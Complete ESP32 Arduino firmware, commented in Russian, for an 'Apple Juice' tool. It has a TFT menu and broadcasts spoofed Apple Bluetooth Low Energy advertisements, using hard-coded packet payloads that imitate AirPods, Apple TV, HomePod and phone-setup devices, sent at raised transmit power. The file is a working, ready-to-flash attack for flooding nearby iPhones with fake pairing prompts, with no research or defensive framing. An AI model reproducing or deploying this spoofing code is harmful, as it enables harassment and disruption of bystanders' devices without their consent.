// ESP32 Apple Juice Firmware v4.2 - White/Black/Grey Theme
// RFXCORE // MONOCHROME UI
// TFT 240x320 landscape, монохромная тема

#include <Arduino.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <SPI.h>
#include <TFT_eSPI.h>

// Конфигурация дисплея 240x320 landscape
#define TFT_BL   4
#define TFT_ROT  1  // Landscape orientation

// Только одна кнопка - BOOT (GPIO0)
const int boutonBoot = 0;
const int ledPin = 2;

// Глобальные объекты
TFT_eSPI tft = TFT_eSPI();
BLEAdvertising *pAdvertising;

// Состояния системы
enum SystemState {
  STATE_MAIN_MENU,     // Главное меню
  STATE_DEVICE_MENU,   // Меню выбора устройства
  STATE_ACTIVE,        // Режим работы Apple Juice
  STATE_INACTIVE,      // Ожидание
  STATE_ABOUT          // Информация о системе
};

SystemState currentState = STATE_MAIN_MENU;
int dernierEtatBouton = HIGH;

// Тайминги для двойного нажатия
unsigned long lastPressTime = 0;
unsigned long lastReleaseTime = 0;
bool waitingForSecondPress = false;
const int DOUBLE_PRESS_DELAY = 500;  // 500ms для двойного нажатия

// Переменные для отслеживания кнопки
unsigned long debounceTime = 0;
const int DEBOUNCE_DELAY = 50;

// Монохромная палитра - белый, черный, серый
#define WHITE        0xFFFF
#define BLACK        0x0000
#define DARK_GRAY    0x4208
#define MEDIUM_GRAY  0x8410
#define LIGHT_GRAY   0xC618
#define ACCENT_GRAY  0x94B2
#define RED_ACTIVE   0xF800
#define GREEN_ACTIVE 0x07E0
#define BLUE_SELECTED 0xb5b6  // Темно-синий для выделения

// Структура для статистики
struct Stats {
  uint32_t packets_sent = 0;
  uint32_t last_update = 0;
  uint8_t packets_per_sec = 0;
} stats;

// Структура устройства Apple Juice
struct AppleDevice {
  uint8_t id;
  const char* name;
  uint8_t data[31];
  size_t length;
  bool isTVMode;
};

// Список устройств Apple Juice (10 популярных устройств)
AppleDevice appleDevices[] = {
  {1, "Airpods 1st", {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, 31, false},
  {2, "Airpods Pro", {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, 31, false},
  {3, "Airpods Max", {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, 31, false},
  {4, "Airpods Gen2", {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, 31, false},
  {5, "Airpods Gen3", {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, 31, false},
  {6, "Airpods Pro 2", {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, 31, false},
  {7, "AppleTV Setup", {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00}, 23, true},
  {8, "AppleTV Pair", {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00}, 23, true},
  {9, "Homepod Setup", {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00}, 23, true},
  {10, "Phone Setup", {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00}, 23, true}
};

const int TOTAL_DEVICES = 10;
int currentDeviceIndex = 0;
int scrollOffset = 0;
const int VISIBLE_ITEMS = 5;
bool isActive = false;
int delaySeconds = 3;

// Главное меню - варианты выбора
enum MainMenuOption {
  MENU_APPLE_JUICE,
  MENU_ABOUT,
  MENU_TOTAL
};

int currentMainMenuOption = MENU_APPLE_JUICE;

// Получение текущего устройства
AppleDevice* getCurrentDevice() {
  return &appleDevices[currentDeviceIndex];
}

// Улучшенная обработка кнопки с дебаунсом
void handleButton() {
  int etatBouton = digitalRead(boutonBoot);
  unsigned long currentTime = millis();
  
  // Дебаунс
  if (currentTime - debounceTime < DEBOUNCE_DELAY) {
    dernierEtatBouton = etatBouton;
    return;
  }
  
  // Обнаружение нажатия (переход HIGH -> LOW)
  if (etatBouton == LOW && dernierEtatBouton == HIGH) {
    debounceTime = currentTime;
    lastPressTime = currentTime;
    
    // Проверка второго нажатия для двойного клика
    if (waitingForSecondPress && (currentTime - lastReleaseTime) < DOUBLE_PRESS_DELAY) {
      waitingForSecondPress = false;
      
      // Обработка двойного нажатия
      if (currentState == STATE_DEVICE_MENU) {
        // Двойное нажатие в меню устройств = выбор устройства
        currentState = STATE_INACTIVE;
        showMainInterface();
        
        // Визуальная обратная связь
        digitalWrite(ledPin, HIGH);
        delay(100);
        digitalWrite(ledPin, LOW);
        delay(100);
        digitalWrite(ledPin, HIGH);
        delay(100);
        digitalWrite(ledPin, LOW);
      }
      else if (currentState == STATE_MAIN_MENU) {
        // Двойное нажатие в главном меню = выбор опции
        if (currentMainMenuOption == MENU_APPLE_JUICE) {
          currentState = STATE_DEVICE_MENU;
          showDeviceMenu();
        }
        else if (currentMainMenuOption == MENU_ABOUT) {
          currentState = STATE_ABOUT;
          showAboutScreen();
        }
        
        digitalWrite(ledPin, HIGH);
        delay(100);
        digitalWrite(ledPin, LOW);
      }
    }
  }
  
  // Обнаружение отпускания (переход LOW -> HIGH)
  if (etatBouton == HIGH && dernierEtatBouton == LOW) {
    debounceTime = currentTime;
    lastReleaseTime = currentTime;
    
    // Обработка одиночного нажатия (после отпускания)
    unsigned long pressDuration = currentTime - lastPressTime;
    
    if (pressDuration > 50 && pressDuration < 300) {  // Короткое нажатие
      // Начинаем ожидание второго нажатия для двойного клика
      waitingForSecondPress = true;
    } else if (pressDuration >= 3000) {
      // Длительное нажатие (3 секунды)
      waitingForSecondPress = false;
      handleLongPress();
    }
  }
  
  // Сброс ожидания двойного нажатия если прошло время
  if (waitingForSecondPress && (currentTime - lastReleaseTime) > DOUBLE_PRESS_DELAY) {
    waitingForSecondPress = false;
    // Если не было второго нажатия, обрабатываем как одиночное
    handleSinglePress();
  }
  
  dernierEtatBouton = etatBouton;
}

// Обработка одиночного нажатия
void handleSinglePress() {
  if (currentState == STATE_MAIN_MENU) {
    // Одиночное нажатие в главном меню = переключение опций
    currentMainMenuOption = (currentMainMenuOption + 1) % MENU_TOTAL;
    showMainMenu();
    
    digitalWrite(ledPin, HIGH);
    delay(30);
    digitalWrite(ledPin, LOW);
  }
  else if (currentState == STATE_DEVICE_MENU) {
    // Одиночное нажатие в меню устройств = переключение устройства
    currentDeviceIndex = (currentDeviceIndex + 1) % TOTAL_DEVICES;
    
    // Автоматическая прокрутка
    if (currentDeviceIndex >= scrollOffset + VISIBLE_ITEMS) {
      scrollOffset++;
    } else if (currentDeviceIndex < scrollOffset) {
      scrollOffset--;
    }
    
    if (scrollOffset < 0) scrollOffset = 0;
    if (scrollOffset > TOTAL_DEVICES - VISIBLE_ITEMS) scrollOffset = TOTAL_DEVICES - VISIBLE_ITEMS;
    
    showDeviceMenu();
    
    digitalWrite(ledPin, HIGH);
    delay(30);
    digitalWrite(ledPin, LOW);
  } 
  else if (currentState == STATE_INACTIVE) {
    // Одиночное нажатие в режиме ожидания = старт
    isActive = true;
    currentState = STATE_ACTIVE;
    digitalWrite(ledPin, HIGH);
    updateStatus(true);
  }
  else if (currentState == STATE_ACTIVE) {
    // Одиночное нажатие в режиме работы = стоп
    isActive = false;
    currentState = STATE_INACTIVE;
    pAdvertising->stop();
    digitalWrite(ledPin, LOW);
    updateStatus(false);
  }
  else if (currentState == STATE_ABOUT) {
    // Одиночное нажатие в информации = возврат в главное меню
    currentState = STATE_MAIN_MENU;
    showMainMenu();
    
    digitalWrite(ledPin, HIGH);
    delay(100);
    digitalWrite(ledPin, LOW);
  }
}

// Обработка длительного нажатия
void handleLongPress() {
  if (currentState == STATE_ACTIVE) {
    pAdvertising->stop();
    digitalWrite(ledPin, LOW);
  }
  
  // Возврат в главное меню из любого состояния кроме About
  if (currentState != STATE_ABOUT) {
    currentState = STATE_MAIN_MENU;
    isActive = false;
    showMainMenu();
  }
  
  // Индикация длительного нажатия
  for (int i = 0; i < 3; i++) {
    digitalWrite(ledPin, HIGH);
    delay(100);
    digitalWrite(ledPin, LOW);
    delay(100);
  }
}

// Инициализация дисплея
void initDisplay() {
  tft.init();
  tft.setRotation(TFT_ROT);
  tft.fillScreen(BLACK);
  
  pinMode(TFT_BL, OUTPUT);
  digitalWrite(TFT_BL, HIGH);
  
  // Верхняя панель - черный фон
  tft.fillRect(0, 0, 320, 40, BLACK);
  tft.setTextColor(WHITE, BLACK);
  tft.setTextSize(2);
  tft.drawCentreString("Apple32", 160, 12, 1);
  
  // Индикатор батареи в стиле Apple
  tft.fillRoundRect(270, 10, 40, 20, 3, MEDIUM_GRAY);
  tft.fillRoundRect(310, 13, 5, 14, 1, MEDIUM_GRAY);
  tft.fillRoundRect(272, 12, 36, 16, 2, BLACK);
  tft.fillRoundRect(272, 12, 15, 16, 2, ACCENT_GRAY); // 41%
  tft.setTextColor(WHITE, MEDIUM_GRAY);
  tft.drawString("41%", 275, 13, 1);
  
  // Версия в правом верхнем углу
  tft.setTextColor(LIGHT_GRAY, BLACK);
  tft.drawString("v4.2", 20, 12, 1);
}

// Отображение главного меню
void showMainMenu() {
  tft.fillRect(0, 41, 320, 238, BLACK);
  
  // Заголовок меню
  tft.setTextColor(WHITE, BLACK);
  tft.setTextSize(2);
  tft.drawCentreString("MAIN MENU", 160, 50, 2);
  
  // Инструкции
  tft.setTextColor(MEDIUM_GRAY, BLACK);
  tft.setTextSize(1);
  tft.drawCentreString("Single: Navigate | Double: Select", 160, 75, 2);
  
  // Опция Apple Juice
  int yPosApple = 120;
  if (currentMainMenuOption == MENU_APPLE_JUICE) {
    tft.fillRoundRect(50, yPosApple - 10, 220, 40, 8, BLUE_SELECTED);
    tft.setTextColor(WHITE, BLUE_SELECTED);
  } else {
    tft.fillRoundRect(50, yPosApple - 10, 220, 40, 8, DARK_GRAY);
    tft.setTextColor(LIGHT_GRAY, DARK_GRAY);
  }
  
  tft.setTextSize(2);
  tft.drawCentreString("Apple Juice", 160, yPosApple, 1);
  
  // Опция About
  int yPosAbout = 180;
  if (currentMainMenuOption == MENU_ABOUT) {
    tft.fillRoundRect(50, yPosAbout - 10, 220, 40, 8, BLUE_SELECTED);
    tft.setTextColor(WHITE, BLUE_SELECTED);
  } else {
    tft.fillRoundRect(50, yPosAbout - 10, 220, 40, 8, DARK_GRAY);
    tft.setTextColor(LIGHT_GRAY, DARK_GRAY);
  }
  
  tft.setTextSize(2);
  tft.drawCentreString("About System", 160, yPosAbout, 1);
  
  // Индикатор выбора - белая стрелка
  if (currentMainMenuOption == MENU_APPLE_JUICE) {
  } else {
  }
  
  // Инструкции внизу
  tft.setTextColor(MEDIUM_GRAY, BLACK);
  tft.setTextSize(1);
  tft.drawCentreString("Hold 3s to exit from any screen", 160, 260, 2);
}

// Отображение меню выбора устройств
void showDeviceMenu() {
  tft.fillRect(0, 41, 320, 238, BLACK);
  
  // Заголовок меню
  tft.setTextColor(WHITE, BLACK);
  tft.setTextSize(2);
  tft.drawCentreString("SELECT DEVICE", 160, 50, 2);
  
  // Инструкции
  tft.setTextColor(MEDIUM_GRAY, BLACK);
  tft.setTextSize(1);
  tft.drawCentreString("Single: Navigate | Double: Select", 160, 75, 2);
  
  // Отображение списка устройств
  for (int i = 0; i < VISIBLE_ITEMS; i++) {
    int deviceIdx = scrollOffset + i;
    if (deviceIdx >= TOTAL_DEVICES) break;
    
    int yPos = 100 + (i * 30);
    
    // Фон для выбранного элемента
    if (deviceIdx == currentDeviceIndex) {
      tft.fillRoundRect(40, yPos - 5, 240, 25, 5, BLUE_SELECTED);
      tft.setTextColor(WHITE, BLUE_SELECTED);
    } else {
      tft.fillRoundRect(40, yPos - 5, 240, 25, 5, DARK_GRAY);
      tft.setTextColor(LIGHT_GRAY, DARK_GRAY);
    }
    
    // Текст устройства
    tft.setTextSize(1);
    tft.drawCentreString(appleDevices[deviceIdx].name, 160, yPos, 2);
    
    // Индикатор выбора
    if (deviceIdx == currentDeviceIndex) {

    }
  }
  
  // Индикатор прокрутки
  if (TOTAL_DEVICES > VISIBLE_ITEMS) {
    int scrollBarHeight = 100;
    int scrollBarY = 100;
    int scrollPos = map(scrollOffset, 0, TOTAL_DEVICES - VISIBLE_ITEMS, scrollBarY, scrollBarY + scrollBarHeight - 10);
    
    tft.fillRect(300, scrollBarY, 5, scrollBarHeight, DARK_GRAY);
    tft.fillRect(300, scrollPos, 5, 10, ACCENT_GRAY);
  }
  
  // Статус выбора внизу
  tft.setTextColor(WHITE, BLACK);
  tft.drawCentreString("Device " + String(currentDeviceIndex + 1) + "/" + String(TOTAL_DEVICES), 160, 260, 2);
  
  // Индикация ожидания двойного нажатия
  if (waitingForSecondPress) {
    tft.fillCircle(160, 275, 3, GREEN_ACTIVE);
    tft.setTextColor(GREEN_ACTIVE, BLACK);
    tft.drawCentreString("Press again to select", 160, 280, 1);
  } else {
    tft.fillRect(0, 270, 320, 20, BLACK);
  }
}

// Отображение информации о системе
void showAboutScreen() {
  tft.fillRect(0, 41, 320, 238, BLACK);
  
  // Заголовок
  tft.setTextColor(WHITE, BLACK);
  tft.setTextSize(2);
  tft.drawCentreString("SYSTEM INFO", 160, 50, 2);
  
  // Информация
  tft.setTextColor(LIGHT_GRAY, BLACK);
  tft.setTextSize(1);
  
  tft.drawCentreString("Apple Juice Firmware v4.2", 160, 80, 2);
  tft.drawCentreString("ESP32 Dev Board", 160, 100, 2);
  tft.drawCentreString("TFT 240x320 Landscape", 160, 120, 2);
  tft.drawCentreString("BLE Apple Juice Spoofing", 160, 140, 2);
  tft.drawCentreString("10 Apple Devices Supported", 160, 160, 2);
  
  // Разделительная линия
  tft.drawFastHLine(60, 185, 200, MEDIUM_GRAY);
  
  // Техническая информация
  tft.setTextColor(WHITE, BLACK);
  tft.drawCentreString("Technical Specs", 160, 195, 2);
  
  tft.setTextColor(LIGHT_GRAY, BLACK);
  tft.drawCentreString("BLE Power: +9dBm", 160, 215, 1);
  tft.drawCentreString("Packet Interval: 2s", 160, 230, 1);
  tft.drawCentreString("Storage: 10 Profiles", 160, 245, 1);
  
  // Инструкции
  tft.setTextColor(MEDIUM_GRAY, BLACK);
  tft.drawCentreString("Single press: Back to menu", 160, 265, 1);
  tft.drawCentreString("Hold 3s: Main menu from any screen", 160, 280, 1);
}

// Отображение основного интерфейса
void showMainInterface() {
  tft.fillRect(0, 41, 320, 238, BLACK);
  
  // Левый бокс - статус
  tft.fillRoundRect(10, 50, 140, 80, 5, DARK_GRAY);
  tft.drawRoundRect(10, 50, 140, 80, 5, MEDIUM_GRAY);
  tft.setTextColor(WHITE, DARK_GRAY);
  tft.drawCentreString("STATUS", 80, 55, 2);
  
  // Правый бокс - статистика
  tft.fillRoundRect(170, 50, 140, 80, 5, DARK_GRAY);
  tft.drawRoundRect(170, 50, 140, 80, 5, MEDIUM_GRAY);
  tft.setTextColor(WHITE, DARK_GRAY);
  tft.drawCentreString("STATS", 240, 55, 2);
  
  // Центральный бокс - устройство
  tft.fillRoundRect(50, 140, 220, 100, 5, DARK_GRAY);
  tft.drawRoundRect(50, 140, 220, 100, 5, MEDIUM_GRAY);
  tft.setTextColor(WHITE, DARK_GRAY);
  tft.drawCentreString("DEVICE", 160, 145, 2);
  
  updateStatus(false);
  updateDeviceInfo();
  updateStats();
}

// Обновление статуса
void updateStatus(bool active) {
  tft.fillRect(30, 80, 100, 30, DARK_GRAY);
  tft.setTextColor(active ? GREEN_ACTIVE : RED_ACTIVE, DARK_GRAY);
  tft.setTextSize(3);
  
  if (active) {
    tft.drawCentreString("ACTIVE", 80, 85, 3);
    tft.fillCircle(80, 120, 8, GREEN_ACTIVE);
  } else {
    tft.drawCentreString("INACTIVE", 80, 85, 3);
    tft.fillCircle(80, 120, 8, DARK_GRAY);
    tft.drawCircle(80, 120, 8, MEDIUM_GRAY);
  }
}

// Обновление информации об устройстве
void updateDeviceInfo() {
  AppleDevice* device = getCurrentDevice();
  
  tft.fillRect(60, 165, 200, 60, DARK_GRAY);
  tft.setTextColor(WHITE, DARK_GRAY);
  tft.setTextSize(2);
  
  tft.drawCentreString(device->name, 160, 170, 2);
  
  tft.setTextColor(LIGHT_GRAY, DARK_GRAY);
  tft.setTextSize(1);
  tft.drawCentreString("Single press: Start/Stop", 160, 200, 2);
  tft.drawCentreString("Hold 3s: Main menu", 160, 215, 2);
}

// Обновление статистики
void updateStats() {
  if (millis() - stats.last_update >= 1000) {
    stats.packets_per_sec = stats.packets_sent - (stats.last_update ? stats.packets_sent : 0);
    stats.last_update = millis();
  }
  
  tft.fillRect(180, 75, 120, 40, DARK_GRAY);
  tft.setTextColor(WHITE, DARK_GRAY);
  tft.setTextSize(2);
  
  char buffer[20];
  sprintf(buffer, "PKTS: %lu", stats.packets_sent);
  tft.drawCentreString(buffer, 240, 75, 1);
  
  sprintf(buffer, "PPS: %d", stats.packets_per_sec);
  tft.drawCentreString(buffer, 240, 95, 1);
}

// Отправка Apple Juice пакета
void sendAppleJuicePacket() {
  AppleDevice* device = getCurrentDevice();
  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
  
  pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
  oAdvertisementData.addData((char*)device->data, device->length);
  pAdvertising->setAdvertisementData(oAdvertisementData);
  
  pAdvertising->start();
  stats.packets_sent++;
  
  if (stats.packets_sent % 5 == 0) {
    updateStats();
  }
}

void setup() {
  Serial.begin(115200);
  delay(100);
  
  Serial.println("[+] Apple Juice Firmware v4.2 - Monochrome Theme");
  Serial.println("[+] Main menu system initialized");
  Serial.println("[+] Total devices: " + String(TOTAL_DEVICES));
  
  // Инициализация пинов
  pinMode(boutonBoot, INPUT_PULLUP);
  pinMode(ledPin, OUTPUT);
  digitalWrite(ledPin, LOW);
  
  // Инициализация дисплея
  initDisplay();
  showMainMenu();
  
  // Инициализация BLE
  BLEDevice::init("AppleJuice-FW");
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();
  
  Serial.println("[+] System ready - Starting from main menu");
  Serial.println("[+] Single press: Navigate | Double press: Select");
  Serial.println("[+] Hold 3s: Returns to main menu (except About)");
}

void loop() {
  // Основная обработка кнопки
  handleButton();
  
  // Режим работы (отправка пакетов)
  if (currentState == STATE_ACTIVE && isActive) {
    static uint32_t last_packet = 0;
    
    if (millis() - last_packet >= (delaySeconds * 1000)) {
      sendAppleJuicePacket();
      delay(100);
      pAdvertising->stop();
      last_packet = millis();
      
      // Мигание LED в такт отправке
      static bool ledState = true;
      digitalWrite(ledPin, ledState);
      ledState = !ledState;
    }
  }
  
  // Обновление статистики
  static uint32_t last_stats_update = 0;
  if (millis() - last_stats_update >= 1000) {
    if (currentState == STATE_INACTIVE || currentState == STATE_ACTIVE) {
      updateStats();
    }
    last_stats_update = millis();
  }
  
  // Обновление индикации ожидания двойного нажатия
  static uint32_t last_blink = 0;
  if (waitingForSecondPress && currentState == STATE_DEVICE_MENU && (millis() - last_blink > 500)) {
    last_blink = millis();
    // Мигание индикатора в меню устройств
    tft.fillCircle(160, 275, 3, (millis() % 1000 < 500) ? GREEN_ACTIVE : BLACK);
  }
  
  delay(10);
}